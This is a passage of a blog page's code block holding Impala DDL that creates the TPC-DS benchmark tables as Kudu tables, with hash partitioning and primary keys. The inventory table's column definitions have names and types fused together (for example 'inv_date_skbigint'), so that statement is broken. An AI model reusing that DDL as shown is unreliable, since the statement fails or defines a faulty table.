</span><br><span class="line">,     cc_mkt_class              string                      </span><br><span class="line">,     cc_mkt_desc               string                  </span><br><span class="line">,     cc_market_manager         string                   </span><br><span class="line">,     cc_division               int                       </span><br><span class="line">,     cc_division_name          string                   </span><br><span class="line">,     cc_company                int                       </span><br><span class="line">,     cc_company_name           string                      </span><br><span class="line">,     cc_street_number          string                      </span><br><span class="line">,     cc_street_name            string                   </span><br><span class="line">,     cc_street_type            string                      </span><br><span class="line">,     cc_suite_number           string                      </span><br><span class="line">,     cc_city                   string                   </span><br><span class="line">,     cc_county                 string                   </span><br><span class="line">,     cc_state                  string                       </span><br><span class="line">,     cc_zip                    string                      </span><br><span class="line">,     cc_country                string                   </span><br><span class="line">,     cc_gmt_offset             double                  </span><br><span class="line">,     cc_tax_percentage         double</span><br><span class="line">,PRIMARY KEY(cc_call_center_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_page;</span><br><span class="line"></span><br><span class="line">create table catalog_page(</span><br><span class="line">      cp_catalog_page_sk        bigint               </span><br><span class="line">,     cp_catalog_page_id        string              </span><br><span class="line">,     cp_start_date_sk          bigint                       </span><br><span class="line">,     cp_end_date_sk            bigint                       </span><br><span class="line">,     cp_department             string                   </span><br><span class="line">,     cp_catalog_number         int                       </span><br><span class="line">,     cp_catalog_page_number    int                       </span><br><span class="line">,     cp_description            string                  </span><br><span class="line">,     cp_type                   string</span><br><span class="line">,PRIMARY KEY(cp_catalog_page_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_returns;</span><br><span class="line"></span><br><span class="line">create table catalog_returns</span><br><span class="line">(</span><br><span class="line">    cr_item_sk                bigint,</span><br><span class="line">cr_order_number           bigint,</span><br><span class="line">    cr_returned_date_sk       bigint,</span><br><span class="line">    cr_returned_time_sk       bigint,</span><br><span class="line">    cr_refunded_customer_sk   bigint,</span><br><span class="line">    cr_refunded_cdemo_sk      bigint,</span><br><span class="line">    cr_refunded_hdemo_sk      bigint,</span><br><span class="line">    cr_refunded_addr_sk       bigint,</span><br><span class="line">    cr_returning_customer_sk  bigint,</span><br><span class="line">    cr_returning_cdemo_sk     bigint,</span><br><span class="line">    cr_returning_hdemo_sk     bigint,</span><br><span class="line">    cr_returning_addr_sk      bigint,</span><br><span class="line">    cr_call_center_sk         bigint,</span><br><span class="line">    cr_catalog_page_sk        bigint,</span><br><span class="line">    cr_ship_mode_sk           bigint,</span><br><span class="line">    cr_warehouse_sk           bigint,</span><br><span class="line">    cr_reason_sk              bigint,</span><br><span class="line">    cr_return_quantity        int,</span><br><span class="line">    cr_return_amount          double,</span><br><span class="line">    cr_return_tax             double,</span><br><span class="line">    cr_return_amt_inc_tax     double,</span><br><span class="line">    cr_fee                    double,</span><br><span class="line">    cr_return_ship_cost       double,</span><br><span class="line">    cr_refunded_cash          double,</span><br><span class="line">    cr_reversed_charge        double,</span><br><span class="line">    cr_store_credit           double,</span><br><span class="line">    cr_net_loss               double</span><br><span class="line">,PRIMARY KEY(cr_item_sk,cr_order_number)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cr_item_sk) PARTITIONS 16</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists catalog_sales;</span><br><span class="line"></span><br><span class="line">create table catalog_sales</span><br><span class="line">(</span><br><span class="line">    cs_item_sk                bigint,</span><br><span class="line">    cs_order_number           bigint,</span><br><span class="line">    cs_sold_date_sk           bigint,</span><br><span class="line">    cs_sold_time_sk           bigint,</span><br><span class="line">    cs_ship_date_sk           bigint,</span><br><span class="line">    cs_bill_customer_sk       bigint,</span><br><span class="line">    cs_bill_cdemo_sk          bigint,</span><br><span class="line">    cs_bill_hdemo_sk          bigint,</span><br><span class="line">    cs_bill_addr_sk           bigint,</span><br><span class="line">    cs_ship_customer_sk       bigint,</span><br><span class="line">    cs_ship_cdemo_sk          bigint,</span><br><span class="line">    cs_ship_hdemo_sk          bigint,</span><br><span class="line">    cs_ship_addr_sk           bigint,</span><br><span class="line">    cs_call_center_sk         bigint,</span><br><span class="line">    cs_catalog_page_sk        bigint,</span><br><span class="line">    cs_ship_mode_sk           bigint,</span><br><span class="line">    cs_warehouse_sk           bigint,</span><br><span class="line">    cs_promo_sk               bigint,</span><br><span class="line">    cs_quantity               int,</span><br><span class="line">    cs_wholesale_cost         double,</span><br><span class="line">    cs_list_price             double,</span><br><span class="line">    cs_sales_price            double,</span><br><span class="line">    cs_ext_discount_amt       double,</span><br><span class="line">    cs_ext_sales_price        double,</span><br><span class="line">    cs_ext_wholesale_cost     double,</span><br><span class="line">    cs_ext_list_price         double,</span><br><span class="line">    cs_ext_tax                double,</span><br><span class="line">    cs_coupon_amt             double,</span><br><span class="line">    cs_ext_ship_cost          double,</span><br><span class="line">    cs_net_paid               double,</span><br><span class="line">    cs_net_paid_inc_tax       double,</span><br><span class="line">    cs_net_paid_inc_ship      double,</span><br><span class="line">    cs_net_paid_inc_ship_tax  double,</span><br><span class="line">    cs_net_profit             double</span><br><span class="line">,PRIMARY KEY(cs_item_sk,cs_order_number)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cs_item_sk) PARTITIONS 64</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer_address;</span><br><span class="line"></span><br><span class="line">create table customer_address</span><br><span class="line">(</span><br><span class="line">    ca_address_sk             bigint,</span><br><span class="line">    ca_address_id             string,</span><br><span class="line">    ca_street_number          string,</span><br><span class="line">    ca_street_name            string,</span><br><span class="line">    ca_street_type            string,</span><br><span class="line">    ca_suite_number           string,</span><br><span class="line">    ca_city                   string,</span><br><span class="line">    ca_county                 string,</span><br><span class="line">    ca_state                  string,</span><br><span class="line">    ca_zip                    string,</span><br><span class="line">    ca_country                string,</span><br><span class="line">    ca_gmt_offset             double,</span><br><span class="line">    ca_location_type          string</span><br><span class="line">,PRIMARY KEY(ca_address_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ca_address_sk) PARTITIONS 6</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer_demographics;</span><br><span class="line"></span><br><span class="line">create table customer_demographics</span><br><span class="line">(</span><br><span class="line">    cd_demo_sk                bigint,</span><br><span class="line">    cd_gender                 string,</span><br><span class="line">    cd_marital_status         string,</span><br><span class="line">    cd_education_status       string,</span><br><span class="line">    cd_purchase_estimate      int,</span><br><span class="line">    cd_credit_rating          string,</span><br><span class="line">    cd_dep_count              int,</span><br><span class="line">    cd_dep_employed_count     int,</span><br><span class="line">    cd_dep_college_count      int </span><br><span class="line">,PRIMARY KEY(cd_demo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (cd_demo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists customer;</span><br><span class="line"></span><br><span class="line">create table customer</span><br><span class="line">(</span><br><span class="line">    c_customer_sk             bigint,</span><br><span class="line">    c_customer_id             string,</span><br><span class="line">    c_current_cdemo_sk        bigint,</span><br><span class="line">    c_current_hdemo_sk        bigint,</span><br><span class="line">    c_current_addr_sk         bigint,</span><br><span class="line">    c_first_shipto_date_sk    bigint,</span><br><span class="line">    c_first_sales_date_sk     bigint,</span><br><span class="line">    c_salutation              string,</span><br><span class="line">    c_first_name              string,</span><br><span class="line">    c_last_name               string,</span><br><span class="line">    c_preferred_cust_flag     string,</span><br><span class="line">    c_birth_day               int,</span><br><span class="line">    c_birth_month             int,</span><br><span class="line">    c_birth_year              int,</span><br><span class="line">    c_birth_country           string,</span><br><span class="line">    c_login                   string,</span><br><span class="line">    c_email_address           string,</span><br><span class="line">    c_last_review_date        string</span><br><span class="line">,PRIMARY KEY(c_customer_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (c_customer_sk) PARTITIONS 8</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists date_dim;</span><br><span class="line"></span><br><span class="line">create table date_dim</span><br><span class="line">(</span><br><span class="line">    d_date_sk                 bigint,</span><br><span class="line">    d_date_id                 string,</span><br><span class="line">    d_date                    string,</span><br><span class="line">    d_month_seq               int,</span><br><span class="line">    d_week_seq                int,</span><br><span class="line">    d_quarter_seq             int,</span><br><span class="line">    d_year                    int,</span><br><span class="line">    d_dow                     int,</span><br><span class="line">    d_moy                     int,</span><br><span class="line">    d_dom                     int,</span><br><span class="line">    d_qoy                     int,</span><br><span class="line">    d_fy_year                 int,</span><br><span class="line">    d_fy_quarter_seq          int,</span><br><span class="line">    d_fy_week_seq             int,</span><br><span class="line">    d_day_name                string,</span><br><span class="line">    d_quarter_name            string,</span><br><span class="line">    d_holiday                 string,</span><br><span class="line">    d_weekend                 string,</span><br><span class="line">    d_following_holiday       string,</span><br><span class="line">    d_first_dom               int,</span><br><span class="line">    d_last_dom                int,</span><br><span class="line">    d_same_day_ly             int,</span><br><span class="line">    d_same_day_lq             int,</span><br><span class="line">    d_current_day             string,</span><br><span class="line">    d_current_week            string,</span><br><span class="line">    d_current_month           string,</span><br><span class="line">    d_current_quarter         string,</span><br><span class="line">    d_current_year            string </span><br><span class="line">,PRIMARY KEY(d_date_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (d_date_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists household_demographics;</span><br><span class="line"></span><br><span class="line">create table household_demographics</span><br><span class="line">(</span><br><span class="line">    hd_demo_sk                bigint,</span><br><span class="line">    hd_income_band_sk         bigint,</span><br><span class="line">    hd_buy_potential          string,</span><br><span class="line">    hd_dep_count              int,</span><br><span class="line">    hd_vehicle_count          int</span><br><span class="line">,PRIMARY KEY(hd_demo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (hd_demo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists income_band;</span><br><span class="line"></span><br><span class="line">create table income_band(</span><br><span class="line">      ib_income_band_sk         bigint               </span><br><span class="line">,     ib_lower_bound            int                       </span><br><span class="line">,     ib_upper_bound            int</span><br><span class="line">,PRIMARY KEY(ib_income_band_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ib_income_band_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists inventory;</span><br><span class="line"></span><br><span class="line">create table inventory</span><br><span class="line">(</span><br><span class="line">    inv_date_skbigint,</span><br><span class="line">    inv_item_skbigint,</span><br><span class="line">    inv_warehouse_skbigint,</span><br><span class="line">    inv_quantity_on_handint</span><br><span class="line">,PRIMARY KEY(inv_date_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (inv_date_sk) PARTITIONS 12</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists item;</span><br><span class="line"></span><br><span class="line">create table item</span><br><span class="line">(</span><br><span class="line">    i_item_sk                 bigint,</span><br><span class="line">    i_item_id                 string,</span><br><span class="line">    i_rec_start_date          string,</span><br><span class="line">    i_rec_end_date            string,</span><br><span class="line">    i_item_desc               string,</span><br><span class="line">    i_current_price           double,</span><br><span class="line">    i_wholesale_cost          double,</span><br><span class="line">    i_brand_id                int,</span><br><span class="line">    i_brand                   string,</span><br><span class="line">    i_class_id                int,</span><br><span class="line">    i_class                   string,</span><br><span class="line">    i_category_id             int,</span><br><span class="line">    i_category                string,</span><br><span class="line">    i_manufact_id             int,</span><br><span class="line">    i_manufact                string,</span><br><span class="line">    i_size                    string,</span><br><span class="line">    i_formulation             string,</span><br><span class="line">    i_color                   string,</span><br><span class="line">    i_units                   string,</span><br><span class="line">    i_container               string,</span><br><span class="line">    i_manager_id              int,</span><br><span class="line">    i_product_name            string</span><br><span class="line">,PRIMARY KEY(i_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (i_item_sk) PARTITIONS 4</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists promotion;</span><br><span class="line"></span><br><span class="line">create table promotion</span><br><span class="line">(</span><br><span class="line">    p_promo_sk                bigint,</span><br><span class="line">    p_promo_id                string,</span><br><span class="line">    p_start_date_sk           bigint,</span><br><span class="line">    p_end_date_sk             bigint,</span><br><span class="line">    p_item_sk                 bigint,</span><br><span class="line">    p_cost                    double,</span><br><span class="line">    p_response_target         int,</span><br><span class="line">    p_promo_name              string,</span><br><span class="line">    p_channel_dmail           string,</span><br><span class="line">    p_channel_email           string,</span><br><span class="line">    p_channel_catalog         string,</span><br><span class="line">    p_channel_tv              string,</span><br><span class="line">    p_channel_radio           string,</span><br><span class="line">    p_channel_press           string,</span><br><span class="line">    p_channel_event           string,</span><br><span class="line">    p_channel_demo            string,</span><br><span class="line">    p_channel_details         string,</span><br><span class="line">    p_purpose                 string,</span><br><span class="line">    p_discount_active         string </span><br><span class="line">,PRIMARY KEY(p_promo_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (p_promo_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists reason;</span><br><span class="line"></span><br><span class="line">create table reason(</span><br><span class="line">      r_reason_sk               bigint               </span><br><span class="line">,     r_reason_id               string              </span><br><span class="line">,     r_reason_desc             string                </span><br><span class="line">,PRIMARY KEY(r_reason_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (r_reason_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists ship_mode;</span><br><span class="line"></span><br><span class="line">create table ship_mode(</span><br><span class="line">      sm_ship_mode_sk           bigint               </span><br><span class="line">,     sm_ship_mode_id           string              </span><br><span class="line">,     sm_type                   string                      </span><br><span class="line">,     sm_code                   string                      </span><br><span class="line">,     sm_carrier                string                      </span><br><span class="line">,     sm_contract               string                      </span><br><span class="line">,PRIMARY KEY(sm_ship_mode_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (sm_ship_mode_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store_returns;</span><br><span class="line"></span><br><span class="line">create table store_returns</span><br><span class="line">(</span><br><span class="line">    sr_item_sk                bigint,</span><br><span class="line">    sr_returned_date_sk       bigint,</span><br><span class="line">    sr_return_time_sk         bigint,</span><br><span class="line">    sr_customer_sk            bigint,</span><br><span class="line">    sr_cdemo_sk               bigint,</span><br><span class="line">    sr_hdemo_sk               bigint,</span><br><span class="line">    sr_addr_sk                bigint,</span><br><span class="line">    sr_store_sk               bigint,</span><br><span class="line">    sr_reason_sk              bigint,</span><br><span class="line">    sr_ticket_number          bigint,</span><br><span class="line">    sr_return_quantity        int,</span><br><span class="line">    sr_return_amt             double,</span><br><span class="line">    sr_return_tax             double,</span><br><span class="line">    sr_return_amt_inc_tax     double,</span><br><span class="line">    sr_fee                    double,</span><br><span class="line">    sr_return_ship_cost       double,</span><br><span class="line">    sr_refunded_cash          double,</span><br><span class="line">    sr_reversed_charge        double,</span><br><span class="line">    sr_store_credit           double,</span><br><span class="line">    sr_net_loss               double,</span><br><span class="line">PRIMARY KEY(sr_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH PARTITIONS 32</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store_sales;</span><br><span class="line"></span><br><span class="line">create table store_sales</span><br><span class="line">(</span><br><span class="line">    ss_item_sk                bigint,</span><br><span class="line">    ss_sold_date_sk           bigint,</span><br><span class="line">    ss_sold_time_sk           bigint,</span><br><span class="line">    ss_customer_sk            bigint,</span><br><span class="line">    ss_cdemo_sk               bigint,</span><br><span class="line">    ss_hdemo_sk               bigint,</span><br><span class="line">    ss_addr_sk                bigint,</span><br><span class="line">    ss_store_sk               bigint,</span><br><span class="line">    ss_promo_sk               bigint,</span><br><span class="line">    ss_ticket_number          bigint,</span><br><span class="line">    ss_quantity               int,</span><br><span class="line">    ss_wholesale_cost         double,</span><br><span class="line">    ss_list_price             double,</span><br><span class="line">    ss_sales_price            double,</span><br><span class="line">    ss_ext_discount_amt       double,</span><br><span class="line">    ss_ext_sales_price        double,</span><br><span class="line">    ss_ext_wholesale_cost     double,</span><br><span class="line">    ss_ext_list_price         double,</span><br><span class="line">    ss_ext_tax                double,</span><br><span class="line">    ss_coupon_amt             double,</span><br><span class="line">    ss_net_paid               double,</span><br><span class="line">    ss_net_paid_inc_tax       double,</span><br><span class="line">    ss_net_profit             double                  </span><br><span class="line">,PRIMARY KEY(ss_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ss_item_sk) PARTITIONS 96</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists store;</span><br><span class="line"></span><br><span class="line">create table store</span><br><span class="line">(</span><br><span class="line">    s_store_sk                bigint,</span><br><span class="line">    s_store_id                string,</span><br><span class="line">    s_rec_start_date          string,</span><br><span class="line">    s_rec_end_date            string,</span><br><span class="line">    s_closed_date_sk          bigint,</span><br><span class="line">    s_store_name              string,</span><br><span class="line">    s_number_employees        int,</span><br><span class="line">    s_floor_space             int,</span><br><span class="line">    s_hours                   string,</span><br><span class="line">    s_manager                 string,</span><br><span class="line">    s_market_id               int,</span><br><span class="line">    s_geography_class         string,</span><br><span class="line">    s_market_desc             string,</span><br><span class="line">    s_market_manager          string,</span><br><span class="line">    s_division_id             int,</span><br><span class="line">    s_division_name           string,</span><br><span class="line">    s_company_id              int,</span><br><span class="line">    s_company_name            string,</span><br><span class="line">    s_street_number           string,</span><br><span class="line">    s_street_name             string,</span><br><span class="line">    s_street_type             string,</span><br><span class="line">    s_suite_number            string,</span><br><span class="line">    s_city                    string,</span><br><span class="line">    s_county                  string,</span><br><span class="line">    s_state                   string,</span><br><span class="line">    s_zip                     string,</span><br><span class="line">    s_country                 string,</span><br><span class="line">    s_gmt_offset              double,</span><br><span class="line">    s_tax_precentage          double                  </span><br><span class="line">,PRIMARY KEY(s_store_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (s_store_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists time_dim;</span><br><span class="line"></span><br><span class="line">create table time_dim</span><br><span class="line">(</span><br><span class="line">    t_time_sk                 bigint,</span><br><span class="line">    t_time_id                 string,</span><br><span class="line">    t_time                    int,</span><br><span class="line">    t_hour                    int,</span><br><span class="line">    t_minute                  int,</span><br><span class="line">    t_second                  int,</span><br><span class="line">    t_am_pm                   string,</span><br><span class="line">    t_shift                   string,</span><br><span class="line">    t_sub_shift               string,</span><br><span class="line">    t_meal_time               string</span><br><span class="line">,PRIMARY KEY(t_time_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (t_time_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists warehouse;</span><br><span class="line"></span><br><span class="line">create table warehouse(</span><br><span class="line">      w_warehouse_sk            bigint               </span><br><span class="line">,     w_warehouse_id            string              </span><br><span class="line">,     w_warehouse_name          string                   </span><br><span class="line">,     w_warehouse_sq_ft         int                       </span><br><span class="line">,     w_street_number           string                      </span><br><span class="line">,     w_street_name             string                   </span><br><span class="line">,     w_street_type             string                      </span><br><span class="line">,     w_suite_number            string                      </span><br><span class="line">,     w_city                    string                   </span><br><span class="line">,     w_county                  string                   </span><br><span class="line">,     w_state                   string                       </span><br><span class="line">,     w_zip                     string                      </span><br><span class="line">,     w_country                 string                   </span><br><span class="line">,     w_gmt_offset              double                  </span><br><span class="line">,PRIMARY KEY(w_warehouse_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (w_warehouse_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_page;</span><br><span class="line"></span><br><span class="line">create table web_page(</span><br><span class="line">      wp_web_page_sk            bigint               </span><br><span class="line">,     wp_web_page_id            string              </span><br><span class="line">,     wp_rec_start_date        string                         </span><br><span class="line">,     wp_rec_end_date          string                         </span><br><span class="line">,     wp_creation_date_sk       bigint                       </span><br><span class="line">,     wp_access_date_sk         bigint                       </span><br><span class="line">,     wp_autogen_flag           string                       </span><br><span class="line">,     wp_customer_sk            bigint                       </span><br><span class="line">,     wp_url                    string                  </span><br><span class="line">,     wp_type                   string                      </span><br><span class="line">,     wp_char_count             int                       </span><br><span class="line">,     wp_link_count             int                       </span><br><span class="line">,     wp_image_count            int                       </span><br><span class="line">,     wp_max_ad_count           int</span><br><span class="line">,PRIMARY KEY(wp_web_page_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (wp_web_page_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_returns;</span><br><span class="line"></span><br><span class="line">create table web_returns</span><br><span class="line">(</span><br><span class="line">    wr_item_sk                bigint,</span><br><span class="line">    wr_returned_date_sk       bigint,</span><br><span class="line">    wr_returned_time_sk       bigint,</span><br><span class="line">    wr_refunded_customer_sk   bigint,</span><br><span class="line">    wr_refunded_cdemo_sk      bigint,</span><br><span class="line">    wr_refunded_hdemo_sk      bigint,</span><br><span class="line">    wr_refunded_addr_sk       bigint,</span><br><span class="line">    wr_returning_customer_sk  bigint,</span><br><span class="line">    wr_returning_cdemo_sk     bigint,</span><br><span class="line">    wr_returning_hdemo_sk     bigint,</span><br><span class="line">    wr_returning_addr_sk      bigint,</span><br><span class="line">    wr_web_page_sk            bigint,</span><br><span class="line">    wr_reason_sk              bigint,</span><br><span class="line">    wr_order_number           bigint,</span><br><span class="line">    wr_return_quantity        int,</span><br><span class="line">    wr_return_amt             double,</span><br><span class="line">    wr_return_tax             double,</span><br><span class="line">    wr_return_amt_inc_tax     double,</span><br><span class="line">    wr_fee                    double,</span><br><span class="line">    wr_return_ship_cost       double,</span><br><span class="line">    wr_refunded_cash          double,</span><br><span class="line">    wr_reversed_charge        double,</span><br><span class="line">    wr_account_credit         double,</span><br><span class="line">    wr_net_loss               double</span><br><span class="line">,PRIMARY KEY(wr_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (wr_item_sk) PARTITIONS 8</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_sales;</span><br><span class="line"></span><br><span class="line">create table web_sales</span><br><span class="line">(</span><br><span class="line">    ws_item_sk                bigint,</span><br><span class="line">    ws_sold_date_sk           bigint,</span><br><span class="line">    ws_sold_time_sk           bigint,</span><br><span class="line">    ws_ship_date_sk           bigint,</span><br><span class="line">    ws_bill_customer_sk       bigint,</span><br><span class="line">    ws_bill_cdemo_sk          bigint,</span><br><span class="line">    ws_bill_hdemo_sk          bigint,</span><br><span class="line">    ws_bill_addr_sk           bigint,</span><br><span class="line">    ws_ship_customer_sk       bigint,</span><br><span class="line">    ws_ship_cdemo_sk          bigint,</span><br><span class="line">    ws_ship_hdemo_sk          bigint,</span><br><span class="line">    ws_ship_addr_sk           bigint,</span><br><span class="line">    ws_web_page_sk            bigint,</span><br><span class="line">    ws_web_site_sk            bigint,</span><br><span class="line">    ws_ship_mode_sk           bigint,</span><br><span class="line">    ws_warehouse_sk           bigint,</span><br><span class="line">    ws_promo_sk               bigint,</span><br><span class="line">    ws_order_number           bigint,</span><br><span class="line">    ws_quantity               int,</span><br><span class="line">    ws_wholesale_cost         double,</span><br><span class="line">    ws_list_price             double,</span><br><span class="line">    ws_sales_price            double,</span><br><span class="line">    ws_ext_discount_amt       double,</span><br><span class="line">    ws_ext_sales_price        double,</span><br><span class="line">    ws_ext_wholesale_cost     double,</span><br><span class="line">    ws_ext_list_price         double,</span><br><span class="line">    ws_ext_tax                double,</span><br><span class="line">    ws_coupon_amt             double,</span><br><span class="line">    ws_ext_ship_cost          double,</span><br><span class="line">    ws_net_paid               double,</span><br><span class="line">    ws_net_paid_inc_tax       double,</span><br><span class="line">    ws_net_paid_inc_ship      double,</span><br><span class="line">    ws_net_paid_inc_ship_tax  double,</span><br><span class="line">    ws_net_profit             double</span><br><span class="line">,PRIMARY KEY(ws_item_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (ws_item_sk) PARTITIONS 64</span><br><span class="line">STORED AS KUDU;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists web_site;</span><br><span class="line"></span><br><span class="line">create table web_site</span><br><span class="line">(</span><br><span class="line">    web_site_sk           bigint,</span><br><span class="line">    web_site_id           string,</span><br><span class="line">    web_rec_start_date    string,</span><br><span class="line">    web_rec_end_date      string,</span><br><span class="line">    web_name              string,</span><br><span class="line">    web_open_date_sk      bigint,</span><br><span class="line">    web_close_date_sk     bigint,</span><br><span class="line">    web_class             string,</span><br><span class="line">    web_manager           string,</span><br><span class="line">    web_mkt_id            int,</span><br><span class="line">    web_mkt_class         string,</span><br><span class="line">    web_mkt_desc          string,</span><br><span class="line">    web_market_manager    string,</span><br><span class="line">    web_company_id        int,</span><br><span class="line">    web_company_name      string,</span><br><span class="line">    web_street_number     string,</span><br><span class="line">    web_street_name       string,</span><br><span class="line">    web_street_type       string,</span><br><span class="line">    web_suite_number      string,</span><br><span class="line">    web_city              string,</span><br><span class="line">    web_county            string,</span><br><span class="line">    web_state             string,</span><br><span class="line">    web_zip               string,</span><br><span class="line">    web_country           string,</span><br><span class="line">    web_gmt_offset        double,</span><br><span class="line">    web_tax_percentage    double</span><br><span class="line">,PRIMARY KEY(web_site_sk)</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH (web_site_sk) PARTITIONS 2</span><br><span class="line">STORED AS KUDU;</span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 